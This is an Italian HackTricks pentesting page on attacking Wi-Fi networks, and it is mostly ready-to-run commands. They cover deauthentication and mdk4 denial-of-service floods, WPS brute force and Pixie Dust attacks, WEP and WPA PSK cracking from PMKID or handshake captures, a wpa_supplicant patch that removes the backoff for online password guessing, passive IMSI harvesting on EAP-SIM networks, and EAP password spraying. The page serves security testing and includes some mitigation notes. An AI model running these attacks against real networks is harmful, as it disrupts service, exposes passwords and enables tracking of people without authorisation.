# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandi base Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Strumenti

### Hijacker & NexMon (Wi-Fi interno di Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Esegui airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Può eseguire attacchi Evil Twin, KARMA e Known Beacons e poi utilizzare un template di phishing per ottenere la password reale della rete o catturare le credenziali dei social network.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Questo strumento automatizza attacchi **WPS/WEP/WPA-PSK**. Eseguirà automaticamente:

- Imposta l'interfaccia in monitor mode
- Scansiona le possibili reti - e ti permette di selezionare la/e vittima(e)
- Se WEP - Avvia attacchi WEP
- Se WPA-PSK
- Se WPS: Pixie dust attack e bruteforce attack (attenzione: il bruteforce attack può richiedere molto tempo). Nota che non prova null PIN né database/generated PINs.
- Cerca di catturare il PMKID dall'AP per crackarlo
- Prova a deauthenticate i client dell'AP per catturare un handshake
- Se PMKID o Handshake, prova il bruteforce usando le top5000 passwords.

## Riepilogo degli Attacchi

- **DoS**
- Deauthentication/disassociation -- Disconnetti tutti (o un ESSID/Client specifico)
- Random fake APs -- Nascondi reti, possibile far crashare gli scanner
- Overload AP -- Prova a killare l'AP (di solito non molto utile)
- WIDS -- Interagire con l'IDS
- TKIP, EAPOL -- Alcuni attacchi specifici per DoS di alcuni APs
- **Cracking**
- Crack **WEP** (diversi tools e metodi)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Utile per catturare captive portal creds e/o eseguire LAN attacks
- **WPA-PSK** Evil Twin -- Utile per network attacks se conosci la password
- **WPA-MGT** -- Utile per catturare company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Utile per catturare captive portal creds e/o eseguire LAN attacks
- **+ WPA** -- Utile per catturare WPA handshakes

## Note rapide su reti Open / OWE

- **Passive capture** su SSID open funziona ancora con monitor mode e tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) esegue uno scambio di chiavi per stazione (no PSK), quindi i frame trasmessi via radio sono cifrati anche sugli SSID "open". Essendo basato su WPA3, applica anche **802.11w PMF**, che blocca frame di deauth/disassoc contraffatti.
- OWE **does not authenticate** joiners: chiunque può associarsi, quindi **verify client isolation** invece di fidarsi delle affermazioni di marketing. Senza isolation, ARP spoofing o responder-style poisoning sul L2 locale funziona ancora.
- **Evil Twin** rimane fattibile su SSID open/OWE presentando un segnale più forte; PMF rimuove solo la scorciatoia della deauth. Se le vittime accettano un certificato TLS contraffatto, si ristabilisce un MitM completo su HTTP(S).
- Il broadcast poisoning su open guest Wi-Fi fornisce facilmente creds/hashes (LLMNR/NBT-NS/mDNS). Vedi:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Descrizione da** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, un metodo diffuso nel Wi-Fi hacking, consistono nella falsificazione di frame "management" per **disconnettere forzatamente i dispositivi da una rete**. Questi pacchetti non cifrati ingannano i client facendoli credere che provengano dalla rete legittima, permettendo agli attaccanti di raccogliere WPA handshakes per scopi di cracking o di interrompere persistentemente le connessioni di rete. Questa tattica, allarmante nella sua semplicità, è ampiamente utilizzata e ha implicazioni significative per la sicurezza delle reti.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 means deauthentication
- 1 è il numero di deauths da inviare (puoi inviarne più se vuoi); 0 significa inviarli continuamente
- -a 00:14:6C:7E:40:80 è l'indirizzo MAC dell'access point
- -c 00:0F:B5:34:30:30 è l'indirizzo MAC del client da deauthenticate; se questo è omesso viene inviata una deauthentication broadcast (non sempre funziona)
- ath0 è il nome dell'interfaccia

### Disassociation Packets

**Disassociation packets**, simili ai deauthentication packets, sono un tipo di management frame usato nelle reti Wi‑Fi. Questi pacchetti servono a interrompere la connessione tra un dispositivo (come un laptop o uno smartphone) e un access point (AP). La distinzione principale tra disassociation e deauthentication sta negli scenari d'uso. Mentre un AP emette **deauthentication packets per rimuovere esplicitamente dispositivi rogue dalla rete, i disassociation packets vengono tipicamente inviati quando l'AP è in fase di spegnimento**, riavvio o spostamento, rendendo necessario lo scollegamento di tutti i nodi connessi.

**Questo attacco può essere eseguito con mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Altri attacchi DOS con mdk4**

**Vedi** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Invia beacon frames per mostrare fake APs ai clients. Questo può talvolta mandare in crash network scanners e persino drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

L'invio di authentication frames a tutti gli Access Points (APs) accessibili nel raggio può sovraccaricare questi APs, soprattutto quando sono coinvolti numerosi clients. Questo traffico intenso può portare a instabilità del sistema, facendo sì che alcuni APs si blocchino o addirittura subiscano un reset.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica se un SSID è correttamente visibile e conferma la portata dell'AP. Questa tecnica, combinata con **bruteforcing hidden SSIDs** con o senza wordlist, aiuta a identificare e accedere a reti nascoste.

**ATTACK MODE m: Michael Countermeasures Exploitation**

L'invio di pacchetti casuali o duplicati a diverse code QoS può innescare Michael Countermeasures su **TKIP APs**, causando lo spegnimento dell'AP per un minuto. Questo metodo è una tattica di attacco **DoS** (Denial of Service) efficace.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Il flooding di un AP con **EAPOL Start frames** crea **fake sessions**, sovraccaricando l'AP e bloccando i client legittimi. In alternativa, l'iniezione di **fake EAPOL Logoff messages** disconnette forzatamente i client; entrambi i metodi interrompono efficacemente il servizio di rete.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacchi per le reti mesh IEEE 802.11s**

Vari attacchi sulla gestione dei link e sul routing nelle reti mesh.

**ATTACK MODE w: Confusione WIDS**

La connessione incrociata dei client a più nodi WDS o a fake rogue APs può manipolare Intrusion Detection and Prevention Systems, creando confusione e potenziale abuso del sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Un packet fuzzer che offre diverse sorgenti di pacchetti e un set completo di modificatori per la manipolazione dei pacchetti.

### **Airggedon**

_**Airgeddon**_ offre la maggior parte degli attacchi proposti nei commenti precedenti:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) semplifica il processo di connessione dei dispositivi a un router, aumentando la velocità e la facilità di configurazione per le reti crittografate con **WPA** o **WPA2** Personal. È inefficace contro la sicurezza WEP facilmente compromessa. WPS impiega un PIN a 8 cifre, validato in due metà, rendendolo suscettibile ad attacchi brute-force a causa del numero limitato di combinazioni (11.000 possibilità).

### WPS Bruteforce

Ci sono 2 strumenti principali per eseguire questa azione: Reaver e Bully.

- **Reaver** è stato progettato per essere un attacco robusto e pratico contro WPS, ed è stato testato su un'ampia varietà di access point e implementazioni WPS.
- **Bully** è una **nuova implementazione** dell'attacco brute force WPS, scritta in C. Presenta diversi vantaggi rispetto al codice originale di reaver: meno dipendenze, prestazioni migliorate di memoria e CPU, gestione corretta dell'endianness e un set di opzioni più robusto.

L'attacco sfrutta la vulnerabilità del **WPS PIN**, in particolare l'esposizione delle prime quattro cifre e il ruolo dell'ultima cifra come checksum, facilitando l'attacco brute-force. Tuttavia, le contromisure contro gli attacchi brute-force, come il **blocking MAC addresses** degli attaccanti persistenti, richiedono la **MAC address rotation** per continuare l'attacco.

Una volta ottenuto il WPS PIN con strumenti come Bully o Reaver, l'attaccante può ricavare la WPA/WPA2 PSK, garantendo un **accesso persistente alla rete**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Questo approccio raffinato prende di mira i WPS PINs utilizzando vulnerabilità note:

1. **Pre-discovered PINs**: Utilizzare un database di PINs noti associati a specifici produttori noti per usare WPS PINs uniformi. Questo database correla i primi tre ottetti degli MAC-addresses con i PINs probabili per questi produttori.
2. **PIN Generation Algorithms**: Sfruttare algoritmi come ComputePIN e EasyBox, che calcolano i WPS PINs basandosi sul MAC-address dell'AP. L'Arcadyan algorithm richiede inoltre un device ID, aggiungendo uno strato al processo di generazione del PIN.

### WPS Pixie Dust attack

**Dominique Bongard** ha scoperto una falla in alcuni Access Points (APs) relativa alla generazione di codici segreti, noti come **nonces** (**E-S1** e **E-S2**). Se questi nonces possono essere ricavati, craccare il WPS PIN dell'AP diventa facile. L'AP rivela il PIN all'interno di un codice speciale (hash) per dimostrare che è legittimo e non un AP falso (rogue). Questi nonces sono essenzialmente le "chiavi" per aprire la "cassaforte" che contiene il WPS PIN. Maggiori informazioni si trovano [qui](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

In termini semplici, il problema è che alcuni APs non usavano chiavi abbastanza casuali per cifrare il PIN durante la procedura di connessione. Questo rende il PIN vulnerabile ad essere indovinato dall'esterno della rete (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Se non vuoi mettere il dispositivo in monitor mode, o se `reaver` e `bully` danno dei problemi, puoi provare [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Questo tool può eseguire un Pixie Dust attack senza dover passare in monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Alcuni sistemi mal progettati permettono addirittura a un **Null PIN** (un PIN vuoto o inesistente) di concedere l'accesso, cosa piuttosto insolita. Lo strumento **Reaver** è in grado di testare questa vulnerabilità, a differenza di **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Tutti gli attacchi WPS proposti possono essere facilmente eseguiti usando _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 e 6 ti permettono di provare il **tuo PIN personalizzato** (se ne hai uno)
- 7 e 8 eseguono il **Pixie Dust attack**
- 13 ti permette di testare il **NULL PIN**
- 11 e 12 **raccoglieranno i PIN correlati all'AP selezionato dalle banche dati disponibili** e **genereranno** possibili **PIN** usando: ComputePIN, EasyBox e opzionalmente Arcadyan (consigliato, perché no?)
- 9 e 10 testeranno **ogni possibile PIN**

## **WEP**

**Perché è vulnerabile**

- RC4 seed è semplicemente **IV (24 bits) + shared key**. L'IV è in chiaro, piccolo (2^24), e si ripete rapidamente, quindi i ciphertexts con lo stesso IV riutilizzano il keystream.
- XORing di due ciphertexts con lo stesso keystream leaks `PlaintextA ⊕ PlaintextB`; header prevedibili + bias della RC4 KSA (**FMS**) ti permettono di “vote” i byte della chiave. **PTW** ottimizza questo usando traffico ARP per ridurre i requisiti a decine di migliaia di pacchetti invece di milioni.
- L'integrità è solo **CRC32** (lineare/senza chiave), quindi un attacker può flippar e ricalcolare CRC32 senza la chiave → packet forgery/replay/ARP injection mentre aspetta gli IV.

La rottura pratica è deterministica:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon include ancora un workflow WEP "All-in-One" se preferisci un'interfaccia guidata.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

Nel 2018, **hashcat** [ha rivelato](https://hashcat.net/forum/thread-7717.html) un nuovo metodo di attacco, unico perché necessita di **un solo pacchetto** e non richiede che client siano connessi all'AP di destinazione — solo l'interazione tra l'attaccante e l'AP.

Molti router moderni aggiungono un **campo opzionale** al **primo frame EAPOL** durante l'associazione, noto come `Robust Security Network`. Questo include il `PMKID`.

Come spiega il post originale, il **PMKID** viene creato usando dati noti:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Poiché il "PMK Name" è costante, conosciamo il BSSID dell'AP e della station, e il `PMK` è identico a quello di una full 4-way handshake, **hashcat** può usare queste informazioni per crackare la PSK e recuperare la passphrase!

Per **gather** queste informazioni e **bruteforce** localmente la password puoi fare:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Le **PMKIDs captured** verranno mostrate nella **console** e saranno anche **salvate** all'interno di \_ **/tmp/attack.pcap**\_\
Ora, converti la capture nel formato **hashcat/john** e craccala:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Nota che il formato di un hash corretto contiene **4 parti**, come: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Se il tuo **contiene solo** **3 parti**, allora è **invalido** (la cattura PMKID non era valida).

Nota che `hcxdumptool` **cattura anche handshakes** (apparirà qualcosa del tipo: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Puoi **trasformare** gli **handshakes** nel formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Cattura handshake

Un attacco contro le reti **WPA/WPA2** può essere eseguito catturando un **handshake** e tentando di **crack** la **password** **offline**. Questo processo implica il monitoraggio delle comunicazioni di una rete specifica e del **BSSID** su uno specifico **channel**. Ecco una guida semplificata:

1. Identificare il **BSSID**, il **channel**, e un **connected client** della rete target.
2. Usare `airodump-ng` per monitorare il traffico della rete sul **channel** e **BSSID** specificati, nella speranza di catturare un handshake. Il comando sarà simile a questo:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Per aumentare la probabilità di catturare un handshake, disconnetti momentaneamente il client dalla rete per forzare una re-authentication. Questo può essere fatto usando il comando `aireplay-ng`, che invia deauthentication packets al client:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Nota che poiché il client è stato deautenticato potrebbe tentare di connettersi a un AP diverso o, in altri casi, a una rete diversa._

Quando in `airodump-ng` appaiono alcune informazioni di handshake significa che il handshake è stato catturato e puoi smettere di ascoltare:

![](<../../images/image (172) (1).png>)

Una volta che il handshake è stato catturato puoi **crack**arlo con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Controlla se il handshake è nel file

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se questo strumento trova un handshake non completato di un ESSID prima di quello completato, non rileverà quello valido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Indovinamento PSK online più veloce tramite `wpa_supplicant` ctrl socket (no clients/PMKID)

Quando non ci sono clients e l'AP rifiuta PMKID, puoi iterare le PSKs online senza respawnare i supplicants:

- Applica una patch a `wpa_supplicant.c` per forzare `dur = 0;` nella logica di backoff per auth failure (intorno a `ssid->auth_failures`), disabilitando di fatto il timer di temporary-disable.
- Esegui un singolo daemon con un control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Guidalo tramite l'interfaccia di controllo, riutilizzando lo stesso scan e network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Un piccolo loop Python che legge eventi socket (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) può testare ~100 tentativi in ~5 minuti senza l'overhead di scansione. È comunque rumoroso e rilevabile, ma evita il riavvio del processo ad ogni tentativo e i ritardi di backoff.

## **WPA Enterprise (MGT)**

Nelle **configurazioni WiFi enterprise incontrerai vari metodi di autenticazione**, ognuno dei quali offre diversi livelli di sicurezza e funzionalità di gestione. Quando usi strumenti come `airodump-ng` per ispezionare il traffico di rete, potresti notare identificatori per questi tipi di autenticazione. Alcuni metodi comuni includono:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Questo metodo supporta hardware token e password monouso all'interno di EAP-PEAP. A differenza di MSCHAPv2, non utilizza un peer challenge e invia le password in chiaro all'access point, esponendo al rischio di downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Comporta l'invio dell'hash MD5 della password dal client. Non è **raccomandato** a causa della vulnerabilità ad attacchi dizionario, della mancanza di autenticazione del server e dell'incapacità di generare chiavi WEP specifiche per la sessione.
3. **EAP-TLS (Transport Layer Security)**:
- Utilizza certificati sia lato client sia lato server per l'autenticazione e può generare dinamicamente chiavi WEP basate sull'utente e sulla sessione per proteggere le comunicazioni.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fornisce autenticazione reciproca tramite un tunnel cifrato, insieme a un metodo per derivare chiavi WEP dinamiche per utente e per sessione. Richiede solo certificati lato server, con i client che utilizzano credenziali.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funziona in modo simile a EAP creando un tunnel TLS per la comunicazione protetta. Permette l'uso di protocolli di autenticazione più deboli sopra EAP grazie alla protezione offerta dal tunnel.
- **PEAP-MSCHAPv2**: Spesso indicato come PEAP, combina il meccanismo vulnerabile challenge/response di MSCHAPv2 con un tunnel TLS protettivo.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Simile a EAP-TLS ma avvia un tunnel TLS prima dello scambio dei certificati, offrendo un ulteriore livello di sicurezza.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Cattura dello username

Leggendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) sembra che se stai usando **EAP** i messaggi **"Identity"** debbano essere **supportati**, e lo **username** verrà inviato in **chiaro** nei messaggi **"Response Identity"**.

Anche utilizzando uno dei metodi di autenticazione più sicuri: **PEAP-EAP-TLS**, è possibile **catturare lo username inviato nel protocollo EAP**. Per farlo, **cattura una comunicazione di autenticazione** (avvia `airodump-ng` su un canale e `wireshark` sulla stessa interfaccia) e filtra i pacchetti per `eapol`.\
All'interno del pacchetto "**Response, Identity**", apparirà lo **username** del client.

![](<../../images/image (850).png>)

### Identità anonime

L'occultamento dell'identità è supportato sia da EAP-PEAP sia da EAP-TTLS. Nel contesto di una rete WiFi, una richiesta EAP-Identity è tipicamente avviata dall'access point (AP) durante il processo di association. Per garantire la protezione dell'anonimato dell'utente, la risposta del client EAP sul dispositivo dell'utente contiene solo le informazioni essenziali necessarie al RADIUS server iniziale per elaborare la richiesta. Questo concetto è illustrato attraverso i seguenti scenari:

- EAP-Identity = anonymous
- In questo scenario, tutti gli utenti usano lo pseudonimo "anonymous" come identificatore utente. Il RADIUS server iniziale funge da server EAP-PEAP o EAP-TTLS, responsabile della gestione del lato server del protocollo PEAP o TTLS. Il metodo di autenticazione interno (protetto) viene quindi gestito localmente o delegato a un RADIUS server remoto (home).
- EAP-Identity = anonymous@realm_x
- In questa situazione, utenti di diversi realm nascondono la loro identità indicando però il proprio realm. Ciò permette al RADIUS server iniziale di proxyare le richieste EAP-PEAP o EAP-TTLS ai RADIUS server nei rispettivi home realm, che agiranno come server PEAP o TTLS. Il RADIUS server iniziale opera unicamente come nodo relay RADIUS.
- In alternativa, il RADIUS server iniziale può funzionare come server EAP-PEAP o EAP-TTLS e gestire il metodo di autenticazione protetto oppure inoltrarlo a un altro server. Questa opzione facilita la configurazione di politiche distinte per vari realm.

In EAP-PEAP, una volta stabilito il tunnel TLS tra il server PEAP e il client PEAP, il server PEAP avvia una richiesta EAP-Identity e la trasmette attraverso il tunnel TLS. Il client risponde a questa seconda richiesta EAP-Identity inviando una risposta EAP-Identity contenente la vera identità dell'utente attraverso il tunnel cifrato. Questo approccio impedisce efficacemente la rivelazione dell'identità reale dell'utente a chiunque intercetti il traffico 802.11.

EAP-TTLS segue una procedura leggermente diversa. Con EAP-TTLS, il client tipicamente si autentica utilizzando PAP o CHAP, protetti dal tunnel TLS. In questo caso, il client include un attributo User-Name e un attributo Password o CHAP-Password nel primo messaggio TLS inviato dopo l'instaurazione del tunnel.

Indipendentemente dal protocollo scelto, il server PEAP/TTLS ottiene la conoscenza della vera identità dell'utente dopo che il tunnel TLS è stato stabilito. La vera identità può essere rappresentata come user@realm o semplicemente user. Se il server PEAP/TTLS è anche responsabile dell'autenticazione dell'utente, ora è in possesso dell'identità dell'utente e procede con il metodo di autenticazione protetto dal tunnel TLS. In alternativa, il server PEAP/TTLS può inoltrare una nuova richiesta RADIUS al RADIUS server home dell'utente. Questa nuova richiesta RADIUS omette lo strato PEAP o TTLS del protocollo. Nei casi in cui il metodo di autenticazione protetto sia EAP, i messaggi EAP interni vengono trasmessi al RADIUS server home senza il wrapper EAP-PEAP o EAP-TTLS. L'attributo User-Name del messaggio RADIUS in uscita contiene la vera identità dell'utente, sostituendo l'User-Name anonymous della richiesta RADIUS in ingresso. Quando il metodo di autenticazione protetto è PAP o CHAP (supportato solo da TTLS), l'User-Name e gli altri attributi di autenticazione estratti dal payload TLS sono sostituiti nel messaggio RADIUS in uscita, rimpiazzando l'User-Name anonymous e gli attributi TTLS EAP-Message presenti nella richiesta RADIUS in ingresso.

Per maggiori informazioni consulta [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### EAP basato su SIM (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

L'autenticazione Wi‑Fi basata su SIM usando EAP‑SIM/EAP‑AKA su 802.1X può leak l'identificatore permanente dell'abbonato (IMSI) in chiaro durante la fase di identità non autenticata se la distribuzione non implementa pseudonimi/identità protette o un tunnel TLS attorno all'EAP interno.

Where the leak happens (high level):
- L'associazione 802.11 si completa con la SSID (spesso SSID di carrier offload come FreeWifi_secure, realm di operatori tipo eduroam, ecc.).
- L'Authenticator invia EAP-Request/Identity.
- Client vulnerabili rispondono con EAP-Response/Identity con la loro identità permanente = IMSI codificato come un 3GPP NAI, prima di qualsiasi protezione.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Chiunque ascolti passivamente la RF può leggere quel frame. Non è necessario il 4-way handshake né il keying TLS.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Clicca per espandere</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Note:
- Funziona prima di qualsiasi tunnel TLS se la deployment usa bare EAP‑SIM/AKA senza protected identity/pseudonyms.
- Il valore esposto è un identificatore permanente legato alla SIM dell'abbonato; la raccolta consente il tracciamento a lungo termine e abusi telecom a valle.

Impatto
- Privacy: tracciamento persistente di utenti/dispositivi derivante da acquisizioni passive di traffico Wi‑Fi in luoghi pubblici.
- Telecom abuse bootstrap: con l'IMSI, un attaccante con accesso a SS7/Diameter può interrogare la posizione o tentare l'intercettazione di chiamate/SMS e il furto di MFA.

Mitigations / what to look for
- Verificare che i client usino identità esterne anonime (pseudonyms) per EAP‑SIM/AKA come da linee guida 3GPP (es., 3GPP TS 33.402).
- Preferire il tunneling della fase di identità (es., EAP‑TTLS/PEAP che trasporta inner EAP‑SIM/AKA) in modo che l'IMSI non venga mai inviato in chiaro.
- Le acquisizioni di pacchetti di association/auth non dovrebbero mai rivelare un IMSI grezzo in EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Se è previsto che il client usi **username and password** (nota che **EAP-TLS won't be valid** in questo caso), allora puoi provare a ottenere una **lista** di **usernames** (vedi parte successiva) e **passwords** e tentare di **bruteforce** l'accesso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Puoi anche eseguire questo attack usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria degli attacchi ai client

### Selezione della rete e roaming

- Il protocollo 802.11 definisce come una station si unisce a un Extended Service Set (ESS) ma non specifica i criteri per la selezione di un ESS o di un access point (AP) al suo interno.
- Le station possono effettuare roaming tra AP che condividono lo stesso ESSID, mantenendo la connettività all'interno di un edificio o di un'area.
- Il protocollo richiede l'autenticazione della station verso l'ESS ma non impone l'autenticazione dell'AP verso la station.

### Preferred Network Lists (PNLs)

